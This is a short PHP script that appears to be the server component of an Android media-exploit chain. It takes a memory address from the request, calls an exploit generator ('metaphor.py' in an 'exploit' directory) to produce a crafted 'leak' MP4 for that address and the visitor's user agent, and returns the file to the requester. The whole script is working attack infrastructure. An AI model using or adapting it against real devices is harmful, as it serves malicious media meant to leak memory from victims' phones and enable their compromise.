<?php
    include 'android_ua.php';

    $path = '../exploit';

    $addr = $_GET['addr'];

    $addr = @hexdec($addr);
    $addr = @dechex($addr);

    $hash = md5($_SERVER['HTTP_USER_AGENT']);
    $file_path = "leaks/leak_${addr}_${hash}.mp4";
    exec("python -B $path/metaphor.py -o $file_path leak -a $addr");

    $data = file_get_contents($file_path);
    die($data);
?>